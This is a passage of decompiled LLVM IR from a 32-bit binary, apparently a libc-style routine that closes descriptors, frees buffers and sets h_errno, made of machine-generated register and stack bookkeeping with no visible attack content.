  store i32 %v0_8052e19, i32* %v3_8052e19, align 4
  %v0_8052e1a = load i32, i32* %eax.global-to-local, align 4
  %v2_8052e1a = add i32 %v0_8052df9, 8
  %v3_8052e1a = inttoptr i32 %v2_8052e1a to i32*
  store i32 %v0_8052e1a, i32* %v3_8052e1a, align 4
  %v1_8052e1b = add i32 %v0_8052df9, 152
  %v2_8052e1b = inttoptr i32 %v1_8052e1b to i32*
  %v3_8052e1b = load i32, i32* %v2_8052e1b, align 4
  %v5_8052e1b = add i32 %v0_8052df9, 4
  %v6_8052e1b = inttoptr i32 %v5_8052e1b to i32*
  store i32 %v3_8052e1b, i32* %v6_8052e1b, align 4
  %v0_8052e22 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e22 = load i32, i32* @edi, align 4
  %v2_8052e22 = add i32 %v1_8052e22, 36
  %v3_8052e22 = inttoptr i32 %v2_8052e22 to i32*
  %v4_8052e22 = load i32, i32* %v3_8052e22, align 4
  %v7_8052e22 = mul i32 %v4_8052e22, %v0_8052e22
  store i32 %v7_8052e22, i32* %eax.global-to-local, align 4
  %v2_8052e26 = add i32 %v1_8052e22, 28
  %v3_8052e26 = inttoptr i32 %v2_8052e26 to i32*
  %v4_8052e26 = load i32, i32* %v3_8052e26, align 4
  %v5_8052e26 = add i32 %v4_8052e26, %v7_8052e22
  store i32 %v5_8052e26, i32* %eax.global-to-local, align 4
  %v3_8052e29 = inttoptr i32 %v0_8052df9 to i32*
  store i32 %v5_8052e26, i32* %v3_8052e29, align 4
  %v5_8052e2a = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8052968, i32 %v3_80529c7)
  store i32 %v5_8052e2a, i32* %eax.global-to-local, align 4
  %v0_8052e2f = load i32, i32* @edi, align 4
  %v1_8052e2f = add i32 %v0_8052e2f, 36
  %v2_8052e2f = inttoptr i32 %v1_8052e2f to i32*
  %v3_8052e2f = load i32, i32* %v2_8052e2f, align 4
  %v4_8052e2f = add i32 %v3_8052e2f, 1
  store i32 %v4_8052e2f, i32* %v2_8052e2f, align 4
  br label %dec_label_pc_8052e32

dec_label_pc_8052e32:                             ; preds = %dec_label_pc_8052db6, %dec_label_pc_8052e19
  %v0_8052e32 = load i32, i32* @esp, align 4
  %v1_8052e32 = add i32 %v0_8052e32, 16
  br label %dec_label_pc_8052e35

dec_label_pc_8052e35:                             ; preds = %dec_label_pc_8052dea, %dec_label_pc_8052ddc, %dec_label_pc_8052e32
  %v1_8052e35 = phi i32 [ %v1_8052df9, %dec_label_pc_8052dea ], [ %v1_8052e35.pre, %dec_label_pc_8052ddc ], [ %v1_8052e32, %dec_label_pc_8052e32 ]
  %v0_8052e35 = load i32, i32* @esi, align 4
  %v2_8052e35 = add i32 %v1_8052e35, 52
  %v3_8052e35 = inttoptr i32 %v2_8052e35 to i32*
  %v4_8052e35 = load i32, i32* %v3_8052e35, align 4
  %v5_8052e35 = add i32 %v4_8052e35, %v0_8052e35
  store i32 %v5_8052e35, i32* @esi, align 4
  %v0_8052e39 = load i32, i32* @ebx, align 4
  %v1_8052e39 = add i32 %v0_8052e39, 1
  store i32 %v1_8052e39, i32* @ebx, align 4
  %v2_8052e3a = add i32 %v1_8052e35, 104
  %v3_8052e3a = inttoptr i32 %v2_8052e3a to i32*
  %v4_8052e3a = load i32, i32* %v3_8052e3a, align 4
  %v5_8052e3a = sub i32 %v1_8052e39, %v4_8052e3a
  %v11_8052e3a = xor i32 %v4_8052e3a, %v1_8052e39
  %v12_8052e3a = xor i32 %v5_8052e3a, %v1_8052e39
  %v13_8052e3a = and i32 %v12_8052e3a, %v11_8052e3a
  %v14_8052e3a = icmp slt i32 %v13_8052e3a, 0
  %v16_8052e3a = icmp slt i32 %v5_8052e3a, 0
  %v2_8052e3e = icmp eq i1 %v16_8052e3a, %v14_8052e3a
  br i1 %v2_8052e3e, label %dec_label_pc_8052e4a, label %dec_label_pc_8052e40

dec_label_pc_8052e40:                             ; preds = %dec_label_pc_8052e40.lr.ph, %dec_label_pc_8052e35
  %v0_8052e40 = phi i32 [ %v0_8052e40.pre, %dec_label_pc_8052e40.lr.ph ], [ %v5_8052e35, %dec_label_pc_8052e35 ]
  %v0_8052d1681 = phi i32 [ %v1_8052e3a.pre, %dec_label_pc_8052e40.lr.ph ], [ %v1_8052e35, %dec_label_pc_8052e35 ]
  %v2_8052e40 = add i32 %v0_8052d1681, 16
  %v3_8052e40 = inttoptr i32 %v2_8052e40 to i32*
  %v4_8052e40 = load i32, i32* %v3_8052e40, align 4
  %v5_8052e40 = sub i32 %v0_8052e40, %v4_8052e40
  %v11_8052e40 = xor i32 %v4_8052e40, %v0_8052e40
  %v12_8052e40 = xor i32 %v5_8052e40, %v0_8052e40
  %v13_8052e40 = and i32 %v12_8052e40, %v11_8052e40
  %v14_8052e40 = icmp slt i32 %v13_8052e40, 0
  %v16_8052e40 = icmp slt i32 %v5_8052e40, 0
  %v2_8052e44 = icmp eq i1 %v16_8052e40, %v14_8052e40
  br i1 %v2_8052e44, label %dec_label_pc_8052e4a, label %dec_label_pc_8052d16

dec_label_pc_8052e4a:                             ; preds = %dec_label_pc_8052d39, %dec_label_pc_8052d0a, %dec_label_pc_8052e35, %dec_label_pc_8052d8b, %dec_label_pc_8052d9f, %dec_label_pc_8052e40, %dec_label_pc_8052dc2.dec_label_pc_8052e4a.loopexit_crit_edge
  %v0_8052e4a = phi i32 [ %v0_8052e4a.pre.pre, %dec_label_pc_8052dc2.dec_label_pc_8052e4a.loopexit_crit_edge ], [ %v1_8052e3a.pre, %dec_label_pc_8052d0a ], [ %v1_8052e35, %dec_label_pc_8052e35 ], [ %v1_8052d83, %dec_label_pc_8052d8b ], [ %v1_8052d83, %dec_label_pc_8052d9f ], [ %v0_8052d1681, %dec_label_pc_8052e40 ], [ %v1_8052d2a, %dec_label_pc_8052d39 ]
  %v1_8052e4d = add i32 %v0_8052e4a, 20
  %v2_8052e4d = inttoptr i32 %v1_8052e4d to i32*
  %v3_8052e4d = load i32, i32* %v2_8052e4d, align 4
  %v5_8052e4d = add i32 %v0_8052e4a, -16
  %v6_8052e4d = inttoptr i32 %v5_8052e4d to i32*
  store i32 %v3_8052e4d, i32* %v6_8052e4d, align 4
  %v1_8052e51 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8052e51, i32* %eax.global-to-local, align 4
  %v0_8052e56 = load i32, i32* @esp, align 4
  %v1_8052e59 = add i32 %v0_8052e56, 272
  %v2_8052e59 = inttoptr i32 %v1_8052e59 to i32*
  %v3_8052e59 = load i32, i32* %v2_8052e59, align 4
  %v4_8052e59 = icmp eq i32 %v3_8052e59, 0
  br i1 %v4_8052e59, label %dec_label_pc_8052e6e, label %dec_label_pc_8052e63

dec_label_pc_8052e63:                             ; preds = %dec_label_pc_8052e4a
  store i32 %v3_8052e59, i32* %edx.global-to-local, align 4
  %v2_8052e6a = inttoptr i32 %v3_8052e59 to i32*
  store i32 %v2_80528da, i32* %v2_8052e6a, align 4
  %v0_8052e7a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052e7a

dec_label_pc_8052e6e:                             ; preds = %dec_label_pc_8052e4a
  %v3_8052e71 = inttoptr i32 %v0_8052e56 to i32*
  store i32 %v2_80528da, i32* %v3_8052e71, align 4
  %v1_8052e72 = call i32 @free(i32 -1)
  store i32 %v1_8052e72, i32* %eax.global-to-local, align 4
  %v0_8052e77 = load i32, i32* @esp, align 4
  %v1_8052e77 = add i32 %v0_8052e77, 16
  br label %dec_label_pc_8052e7a

dec_label_pc_8052e7a:                             ; preds = %dec_label_pc_8052e63, %dec_label_pc_8052e6e
  %v0_8052e7a = phi i32 [ %v0_8052e7a.pre, %dec_label_pc_8052e63 ], [ %v1_8052e77, %dec_label_pc_8052e6e ]
  %v1_8052e7d = add i32 %v0_8052e7a, 12
  %v2_8052e7d = inttoptr i32 %v1_8052e7d to i32*
  %v3_8052e7d = load i32, i32* %v2_8052e7d, align 4
  %v5_8052e7d = add i32 %v0_8052e7a, -16
  %v6_8052e7d = inttoptr i32 %v5_8052e7d to i32*
  store i32 %v3_8052e7d, i32* %v6_8052e7d, align 4
  %v1_8052e81 = call i32 @free(i32 -1)
  store i32 %v1_8052e81, i32* @eax, align 4
  %v0_8052e86 = load i32, i32* @esp, align 4
  %v1_8052e89 = add i32 %v0_8052e86, 8
  %v2_8052e89 = inttoptr i32 %v1_8052e89 to i32*
  store i32 ptrtoint (i8** @global_var_80603c8.278 to i32), i32* %v2_8052e89, align 4
  %v1_8052e8e = add i32 %v0_8052e86, 4
  %v2_8052e8e = inttoptr i32 %v1_8052e8e to i32*
  store i32 134550911, i32* %v2_8052e8e, align 4
  %v1_8052e93 = add i32 %v0_8052e86, 200
  store i32 %v1_8052e93, i32* %ebx.global-to-local, align 4
  %v3_8052e9a = inttoptr i32 %v0_8052e86 to i32*
  store i32 %v1_8052e93, i32* %v3_8052e9a, align 4
  %v2_8052e9b = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052968)
  store i32 %v2_8052e9b, i32* %eax.global-to-local, align 4
  %v0_8052ea0 = load i32, i32* @esp, align 4
  %v1_8052ea0 = inttoptr i32 %v0_8052ea0 to i32*
  store i32 ptrtoint (i8** @global_var_80603c8.278 to i32), i32* %v1_8052ea0, align 4
  %v1_8052ea7 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052ea7, i32* %eax.global-to-local, align 4
  %v0_8052eac = load i32, i32* @esp, align 4
  %v1_8052eac = add i32 %v0_8052eac, 56
  %v2_8052eac = inttoptr i32 %v1_8052eac to i32*
  %v3_8052eac = load i32, i32* %v2_8052eac, align 4
  store i32 %v3_8052eac, i32* @eax, align 4
  %v1_8052eb0 = add i32 %v0_8052eac, 72
  %v2_8052eb0 = inttoptr i32 %v1_8052eb0 to i32*
  %v3_8052eb0 = load i32, i32* %v2_8052eb0, align 4
  store i32 %v3_8052eb0, i32* %edx.global-to-local, align 4
  %v1_8052eb4 = inttoptr i32 %v0_8052eac to i32*
  %v3_8052eb4 = add i32 %v0_8052eac, 4
  %v1_8052eb5 = inttoptr i32 %v3_8052eb4 to i32*
  store i32 1, i32* %v1_8052eb5, align 4
  %v0_8052eb8 = load i32, i32* @eax, align 4
  %v1_8052eb8 = sext i32 %v0_8052eb8 to i64
  store i64 %v1_8052eb8, i64* @global_var_80603e0.279, align 32
  %v0_8052ebd = load i32, i32* %edx.global-to-local, align 4
  %v1_8052ebd = trunc i32 %v0_8052ebd to i16
  store i16 %v1_8052ebd, i16* @global_var_805a124.280, align 4
  %v0_8052ec4 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052ec4, i32* %v1_8052eb4, align 4
  %v2_8052ec5 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052968)
  store i32 %v2_8052ec5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053006

dec_label_pc_8052ecf:                             ; preds = %dec_label_pc_8052e09
  %v1_8052ed2 = inttoptr i32 %v0_8052e09 to i32*
  %v2_8052ed2 = load i32, i32* %v1_8052ed2, align 4
  %v5_8052ed2 = inttoptr i32 %v0_8052df9 to i32*
  store i32 %v2_8052ed2, i32* %v5_8052ed2, align 4
  %v1_8052ed4 = call i32 @free(i32 -1)
  store i32 %v1_8052ed4, i32* @eax, align 4
  %v0_8052ed9 = load i32, i32* @esp, align 4
  %v1_8052ed9 = add i32 %v0_8052ed9, 16
  br label %dec_label_pc_8052edc

dec_label_pc_8052edc:                             ; preds = %dec_label_pc_8052c0e, %dec_label_pc_8052d39, %dec_label_pc_8052d31, %dec_label_pc_8052ccd, %dec_label_pc_8052c53, %dec_label_pc_8052c2f, %dec_label_pc_8052ecf
  %v1_8052ee3 = phi i32 [ %v1_8052c23, %dec_label_pc_8052c0e ], [ %v1_8052d2a, %dec_label_pc_8052d39 ], [ %v1_8052d2a, %dec_label_pc_8052d31 ], [ %v1_8052c44, %dec_label_pc_8052ccd ], [ %v1_8052c44, %dec_label_pc_8052c53 ], [ %v1_8052c44, %dec_label_pc_8052c2f ], [ %v1_8052ed9, %dec_label_pc_8052ecf ]
  %v1_8052edc = add i32 %v1_8052ee3, 51
  %v2_8052edc = inttoptr i32 %v1_8052edc to i8*
  %v3_8052edc = load i8, i8* %v2_8052edc, align 1
  %v4_8052edc = icmp eq i8 %v3_8052edc, 0
  %v1_8052ee1 = icmp eq i1 %v4_8052edc, false
  br i1 %v1_8052ee1, label %dec_label_pc_8052f27, label %dec_label_pc_8052ee3

dec_label_pc_8052ee3:                             ; preds = %dec_label_pc_8052edc
  %v0_8052ee3 = load i32, i32* @ecx, align 4
  %v2_8052ee3 = add i32 %v1_8052ee3, -4
  %v3_8052ee3 = inttoptr i32 %v2_8052ee3 to i32*
  store i32 %v0_8052ee3, i32* %v3_8052ee3, align 4
  %v1_8052ee4 = add i32 %v1_8052ee3, -8
  %v2_8052ee4 = inttoptr i32 %v1_8052ee4 to i32*
  store i32 ptrtoint (i32* @global_var_805a128.220 to i32), i32* %v2_8052ee4, align 4
  %v1_8052ee9 = add i32 %v1_8052ee3, -12
  %v2_8052ee9 = inttoptr i32 %v1_8052ee9 to i32*
  store i32 134550911, i32* %v2_8052ee9, align 4
  %v1_8052eee = add i32 %v1_8052ee3, 184
  store i32 %v1_8052eee, i32* @esi, align 4
  %v2_8052ef5 = add i32 %v1_8052ee3, -16
  %v3_8052ef5 = inttoptr i32 %v2_8052ef5 to i32*
  store i32 %v1_8052eee, i32* %v3_8052ef5, align 4
  %v2_8052ef6 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052968)
  store i32 %v2_8052ef6, i32* %eax.global-to-local, align 4
  %v0_8052efb = load i32, i32* @esp, align 4
  %v1_8052efb = inttoptr i32 %v0_8052efb to i32*
  store i32 ptrtoint (i32* @global_var_805a128.220 to i32), i32* %v1_8052efb, align 4
  %v1_8052f02 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052f02, i32* %eax.global-to-local, align 4
  %v0_8052f07 = load i32, i32* @esp, align 4
  %v1_8052f07 = inttoptr i32 %v0_8052f07 to i32*
  %v2_8052f07 = load i32, i32* %v1_8052f07, align 4
  store i32 %v2_8052f07, i32* @eax, align 4
  %v3_8052f07 = add i32 %v0_8052f07, 4
  %v1_8052f08 = inttoptr i32 %v3_8052f07 to i32*
  %v2_8052f08 = load i32, i32* %v1_8052f08, align 4
  store i32 %v2_8052f08, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8052f08, align 4
  %v0_8052f0b = load i32, i32* @esi, align 4
  store i32 %v0_8052f0b, i32* %v1_8052f07, align 4
  %v0_8052f0c = load i32, i32* @global_var_8060818.281, align 8
  store i32 %v0_8052f0c, i32* %ebx.global-to-local, align 4
  %v2_8052f12 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052968)
  store i32 %v2_8052f12, i32* %eax.global-to-local, align 4
  %v0_8052f17 = load i32, i32* @esp, align 4
  %v1_8052f17 = add i32 %v0_8052f17, 16
  %v1_8052f1a = add i32 %v0_8052f0c, -1
  store i32 %v1_8052f1a, i32* @ebx, align 4
  %v1_8052f1b = add i32 %v0_8052f17, 52
  %v2_8052f1b = inttoptr i32 %v1_8052f1b to i32*
  %v3_8052f1b = load i32, i32* %v2_8052f1b, align 4
  %v5_8052f1b = sub i32 %v3_8052f1b, %v1_8052f1a
  %v11_8052f1b = xor i32 %v3_8052f1b, %v1_8052f1a
  %v12_8052f1b = xor i32 %v5_8052f1b, %v3_8052f1b
  %v13_8052f1b = and i32 %v12_8052f1b, %v11_8052f1b
  %v14_8052f1b = icmp slt i32 %v13_8052f1b, 0
  %v16_8052f1b = icmp slt i32 %v5_8052f1b, 0
  %v2_8052f1f = icmp eq i1 %v16_8052f1b, %v14_8052f1b
  br i1 %v2_8052f1f, label %dec_label_pc_8052f27, label %dec_label_pc_8052f21

dec_label_pc_8052f21:                             ; preds = %dec_label_pc_8052ee3
  %v4_8052f21 = add i32 %v3_8052f1b, 1
  store i32 %v4_8052f21, i32* %v2_8052f1b, align 4
  br label %dec_label_pc_8052f48.backedge

dec_label_pc_8052f27:                             ; preds = %dec_label_pc_8052bb0, %dec_label_pc_8052ee3, %dec_label_pc_8052edc, %dec_label_pc_8052bc7
  %v1_8052f34 = phi i32 [ %v1_8052f17, %dec_label_pc_8052ee3 ], [ %v1_8052ee3, %dec_label_pc_8052edc ], [ %v1_8052c03, %dec_label_pc_8052bc7 ], [ %v0_8052f27.pre, %dec_label_pc_8052bb0 ]
  %v1_8052f27 = add i32 %v1_8052f34, 40
  %v2_8052f27 = inttoptr i32 %v1_8052f27 to i32*
  %v3_8052f27 = load i32, i32* %v2_8052f27, align 4
  %v1_8052f2b = add i32 %v3_8052f27, 1
  store i32 %v1_8052f2b, i32* %eax.global-to-local, align 4
  %v1_8052f2c = ashr i32 %v1_8052f2b, 31
  store i32 %v1_8052f2c, i32* %edx.global-to-local, align 4
  %v1_8052f2d = add i32 %v1_8052f34, 248
  %v2_8052f2d = inttoptr i32 %v1_8052f2d to i32*
  %v3_8052f2d = load i32, i32* %v2_8052f2d, align 4
  %v5_8052f2d = zext i32 %v1_8052f2b to i64
  %v7_8052f2d = zext i32 %v1_8052f2c to i64
  %v8_8052f2d = mul nuw i64 %v7_8052f2d, 4294967296
  %v9_8052f2d = or i64 %v8_8052f2d, %v5_8052f2d
  %v10_8052f2d = zext i32 %v3_8052f2d to i64
  %v11_8052f2d = sdiv i64 %v9_8052f2d, %v10_8052f2d
  %v12_8052f2d = trunc i64 %v11_8052f2d to i32
  store i32 %v12_8052f2d, i32* %eax.global-to-local, align 4
  %v13_8052f2d = srem i64 %v9_8052f2d, %v10_8052f2d
  %v14_8052f2d = trunc i64 %v13_8052f2d to i32
  store i32 %v14_8052f2d, i32* %edx.global-to-local, align 4
  store i32 %v14_8052f2d, i32* %v2_8052f27, align 4
  %v1_8052f38 = icmp eq i32 %v14_8052f2d, 0
  %v1_8052f3a = icmp eq i1 %v1_8052f38, false
  br i1 %v1_8052f3a, label %dec_label_pc_8052f40, label %dec_label_pc_8052f3c

dec_label_pc_8052f3c:                             ; preds = %dec_label_pc_8052f27
  %v0_8052f3c = load i32, i32* @esp, align 4
  %v1_8052f3c = add i32 %v0_8052f3c, 28
  %v2_8052f3c = inttoptr i32 %v1_8052f3c to i32*
  %v3_8052f3c = load i32, i32* %v2_8052f3c, align 4
  %v4_8052f3c = add i32 %v3_8052f3c, 1
  store i32 %v4_8052f3c, i32* %v2_8052f3c, align 4
  br label %dec_label_pc_8052f40

dec_label_pc_8052f40:                             ; preds = %dec_label_pc_8052f27, %dec_label_pc_8052f3c
  %v0_8052f40 = load i32, i32* @esp, align 4
  %v1_8052f40 = add i32 %v0_8052f40, 36
  %v2_8052f40 = inttoptr i32 %v1_8052f40 to i32*
  store i32 -1, i32* %v2_8052f40, align 4
  br label %dec_label_pc_8052f48.backedge

dec_label_pc_8052f48.backedge:                    ; preds = %dec_label_pc_8052f40, %dec_label_pc_8052bbe, %dec_label_pc_8052cac, %dec_label_pc_8052f21
  %v0_8052f48.pre = load i32, i32* @esp, align 4
  %v1_8052f48 = add i32 %v0_8052f48.pre, 28
  %v2_8052f48 = inttoptr i32 %v1_8052f48 to i32*
  %v3_8052f48 = load i32, i32* %v2_8052f48, align 4
  %tmp120 = icmp ult i32 %v3_8052f48, 3
  br i1 %tmp120, label %dec_label_pc_80529a8, label %dec_label_pc_8052f6d

dec_label_pc_8052f6d:                             ; preds = %dec_label_pc_8052922, %dec_label_pc_80529be, %dec_label_pc_8052ab2, %dec_label_pc_8052f48.backedge, %entry, %dec_label_pc_80528fc, %dec_label_pc_8052904, %dec_label_pc_8052912
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_8052912 ], [ -1, %dec_label_pc_8052904 ], [ -1, %dec_label_pc_80528fc ], [ -1, %entry ], [ %v0_805296f, %dec_label_pc_8052f48.backedge ], [ %v0_805296f, %dec_label_pc_8052ab2 ], [ %v0_805296f, %dec_label_pc_80529be ], [ %v0_805296f, %dec_label_pc_8052922 ]
  %v0_8052f6d = call i32 @__GI___h_errno_location()
  store i32 %v0_8052f6d, i32* %eax.global-to-local, align 4
  %v1_8052f72 = inttoptr i32 %v0_8052f6d to i32*
  store i32 -1, i32* %v1_8052f72, align 4
  %v0_8052f78 = load i32, i32* @esp, align 4
  %v1_8052f78 = add i32 %v0_8052f78, 44
  %v2_8052f78 = inttoptr i32 %v1_8052f78 to i32*
  %v3_8052f78 = load i32, i32* %v2_8052f78, align 4
  store i32 %v3_8052f78, i32* %eax.global-to-local, align 4
  %v2_8052f7c = add i32 %v0_8052f78, 56
  %v3_8052f7c = inttoptr i32 %v2_8052f7c to i32*
  store i32 %v3_8052f78, i32* %v3_8052f7c, align 4
  br label %dec_label_pc_8052f80

dec_label_pc_8052f80:                             ; preds = %dec_label_pc_8052ce5, %dec_label_pc_8052cbd, %dec_label_pc_8052f6d
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_8052f6d ], [ %v0_805296f, %dec_label_pc_8052ce5 ], [ %v0_805296f, %dec_label_pc_8052cbd ]
  %v0_8052f80 = load i32, i32* @esp, align 4
  %v1_8052f80 = add i32 %v0_8052f80, 20
  %v2_8052f80 = inttoptr i32 %v1_8052f80 to i32*
  %v3_8052f80 = load i32, i32* %v2_8052f80, align 4
  %v13_8052f80 = icmp eq i32 %v3_8052f80, -1
  br i1 %v13_8052f80, label %dec_label_pc_8052f80.dec_label_pc_8052f96_crit_edge, label %dec_label_pc_8052f87

dec_label_pc_8052f80.dec_label_pc_8052f96_crit_edge: ; preds = %dec_label_pc_8052f80
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_8052f96

dec_label_pc_8052f87:                             ; preds = %dec_label_pc_8052f80
  %v3_8052f8a = load i32, i32* %v2_8052f80, align 4
  %v5_8052f8a = add i32 %v0_8052f80, -16
  %v6_8052f8a = inttoptr i32 %v5_8052f8a to i32*
  store i32 %v3_8052f8a, i32* %v6_8052f8a, align 4
  %v1_8052f8e = sext i16 %stack_var_-192.1 to i32
  %v2_8052f8e = call i32 @__libc_close(i32 %v1_8052f8e)
  store i32 %v2_8052f8e, i32* %eax.global-to-local, align 4
  %v0_8052f93 = load i32, i32* @esp, align 4
  %v1_8052f93 = add i32 %v0_8052f93, 16
  br label %dec_label_pc_8052f96

dec_label_pc_8052f96:                             ; preds = %dec_label_pc_8052f80.dec_label_pc_8052f96_crit_edge, %dec_label_pc_8052f87
  %v1_8052f9d.pre-phi = phi i32 [ %.pre, %dec_label_pc_8052f80.dec_label_pc_8052f96_crit_edge ], [ %v1_8052f8e, %dec_label_pc_8052f87 ]
  %v0_8052f96 = phi i32 [ %v0_8052f80, %dec_label_pc_8052f80.dec_label_pc_8052f96_crit_edge ], [ %v1_8052f93, %dec_label_pc_8052f87 ]
  %v1_8052f99 = add i32 %v0_8052f96, 12
  %v2_8052f99 = inttoptr i32 %v1_8052f99 to i32*
  %v3_8052f99 = load i32, i32* %v2_8052f99, align 4
  %v5_8052f99 = add i32 %v0_8052f96, -16
  %v6_8052f99 = inttoptr i32 %v5_8052f99 to i32*
  store i32 %v3_8052f99, i32* %v6_8052f99, align 4
  %v2_8052f9d = call i32 @free(i32 %v1_8052f9d.pre-phi)
  store i32 %v2_8052f9d, i32* %eax.global-to-local, align 4
  %v1_8052fa2 = load i32, i32* @esp, align 4
  %v2_8052fa2 = inttoptr i32 %v1_8052fa2 to i32*
  store i32 %v2_80528da, i32* %v2_8052fa2, align 4
  %v2_8052fa5 = call i32 @free(i32 %v1_8052f9d.pre-phi)
  store i32 %v2_8052fa5, i32* @eax, align 4
  %v0_8052faa = load i32, i32* @esp, align 4
  %v1_8052fad = add i32 %v0_8052faa, 32
  %v2_8052fad = inttoptr i32 %v1_8052fad to i32*
  store i32 -1, i32* %v2_8052fad, align 4
  %v0_8052fb5 = load i32, i32* @esp, align 4
  %v1_8052fb5 = add i32 %v0_8052fb5, 40
  %v2_8052fb5 = inttoptr i32 %v1_8052fb5 to i32*
  %v3_8052fb5 = load i32, i32* %v2_8052fb5, align 4
  %v13_8052fb5 = icmp eq i32 %v3_8052fb5, -1
  br i1 %v13_8052fb5, label %dec_label_pc_8053009, label %dec_label_pc_8052fbc

dec_label_pc_8052fbc:                             ; preds = %dec_label_pc_8052f96
  %v0_8052fbc = load i32, i32* @ecx, align 4
  %v2_8052fbc = add i32 %v0_8052fb5, -4
  %v3_8052fbc = inttoptr i32 %v2_8052fbc to i32*
  store i32 %v0_8052fbc, i32* %v3_8052fbc, align 4
  %v1_8052fbd = add i32 %v0_8052fb5, -8
  %v2_8052fbd = inttoptr i32 %v1_8052fbd to i32*
  store i32 ptrtoint (i8** @global_var_80603c8.278 to i32), i32* %v2_8052fbd, align 4
  %v1_8052fc2 = add i32 %v0_8052fb5, -12
  %v2_8052fc2 = inttoptr i32 %v1_8052fc2 to i32*
  store i32 134550911, i32* %v2_8052fc2, align 4
  %v1_8052fc7 = add i32 %v0_8052fb5, 184
  store i32 %v1_8052fc7, i32* %ebx.global-to-local, align 4
  %v2_8052fce = add i32 %v0_8052fb5, -16
  %v3_8052fce = inttoptr i32 %v2_8052fce to i32*
  store i32 %v1_8052fc7, i32* %v3_8052fce, align 4
  %v3_8052fcf = call i32 @__pthread_return_void(i32 %v1_8052f9d.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8052fcf, i32* %eax.global-to-local, align 4
  %v0_8052fd4 = load i32, i32* @esp, align 4
  %v1_8052fd4 = inttoptr i32 %v0_8052fd4 to i32*
  store i32 ptrtoint (i8** @global_var_80603c8.278 to i32), i32* %v1_8052fd4, align 4
  %v2_8052fdb = call i32 @__pthread_return_0(i32 %v1_8052f9d.pre-phi)
  store i32 %v2_8052fdb, i32* %eax.global-to-local, align 4
  %v0_8052fe0 = load i32, i32* @esp, align 4
  %v1_8052fe0 = add i32 %v0_8052fe0, 56
  %v2_8052fe0 = inttoptr i32 %v1_8052fe0 to i32*
  %v3_8052fe0 = load i32, i32* %v2_8052fe0, align 4
  store i32 %v3_8052fe0, i32* %edx.global-to-local, align 4
  %v1_8052fe4 = add i32 %v0_8052fe0, 72
  %v2_8052fe4 = inttoptr i32 %v1_8052fe4 to i32*
  %v3_8052fe4 = load i32, i32* %v2_8052fe4, align 4
  store i32 %v3_8052fe4, i32* %eax.global-to-local, align 4
  %v1_8052fe8 = sext i32 %v3_8052fe0 to i64
  store i64 %v1_8052fe8, i64* @global_var_80603e0.279, align 32
  %v1_8052fee = trunc i32 %v3_8052fe4 to i16
  store i16 %v1_8052fee, i16* @global_var_805a124.280, align 4
  %v1_8052ff4 = inttoptr i32 %v0_8052fe0 to i32*
  %v2_8052ff4 = load i32, i32* %v1_8052ff4, align 4
  store i32 %v2_8052ff4, i32* @eax, align 4
  %v3_8052ff4 = add i32 %v0_8052fe0, 4
  %v1_8052ff5 = inttoptr i32 %v3_8052ff4 to i32*
  %v2_8052ff5 = load i32, i32* %v1_8052ff5, align 4
  store i32 %v2_8052ff5, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8052ff5, align 4
  %v0_8052ff8 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052ff8, i32* %v1_8052ff4, align 4
  %v3_8052ff9 = call i32 @__pthread_return_void(i32 %v1_8052f9d.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8052ff9, i32* %eax.global-to-local, align 4
  %v0_8052ffe = load i32, i32* @esp, align 4
  %v1_8052ffe = add i32 %v0_8052ffe, 32
  %v2_8052ffe = inttoptr i32 %v1_8052ffe to i32*
  store i32 -1, i32* %v2_8052ffe, align 4
  br label %dec_label_pc_8053006

dec_label_pc_8053006:                             ; preds = %dec_label_pc_8052e7a, %dec_label_pc_8052fbc
  %v0_8053006 = load i32, i32* @esp, align 4
  %v1_8053006 = add i32 %v0_8053006, 16
  br label %dec_label_pc_8053009

dec_label_pc_8053009:                             ; preds = %dec_label_pc_8052f96, %dec_label_pc_8053006
  %v0_8053009 = phi i32 [ %v0_8052fb5, %dec_label_pc_8052f96 ], [ %v1_8053006, %dec_label_pc_8053006 ]
  %v1_8053009 = add i32 %v0_8053009, 16
  %v2_8053009 = inttoptr i32 %v1_8053009 to i32*
  %v3_8053009 = load i32, i32* %v2_8053009, align 4
  store i32 %v3_8053009, i32* %eax.global-to-local, align 4
  %v1_805300d = add i32 %v0_8053009, 220
  %v1_8053013 = inttoptr i32 %v1_805300d to i32*
  %v2_8053013 = load i32, i32* %v1_8053013, align 4
  store i32 %v2_8053013, i32* @ebx, align 4
  %v3_8053013 = add i32 %v0_8053009, 224
  %v1_8053014 = inttoptr i32 %v3_8053013 to i32*
  %v2_8053014 = load i32, i32* %v1_8053014, align 4
  store i32 %v2_8053014, i32* @esi, align 4
  %v3_8053014 = add i32 %v0_8053009, 228
  %v1_8053015 = inttoptr i32 %v3_8053014 to i32*
  %v2_8053015 = load i32, i32* %v1_8053015, align 4
  store i32 %v2_8053015, i32* @edi, align 4
  %v3_8053015 = add i32 %v0_8053009, 232
  %v1_8053016 = inttoptr i32 %v3_8053015 to i32*
  %v2_8053016 = load i32, i32* %v1_8053016, align 4
  store i32 %v2_8053016, i32* @ebp, align 4
  ret i32 %v3_8053009

; uselistorder directives
  uselistorder i32 %v0_8053009, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8052fe0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052fb5, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8052f96, { 1, 0 }
  uselistorder i32 %v1_8052f9d.pre-phi, { 4, 3, 2, 1, 0 }
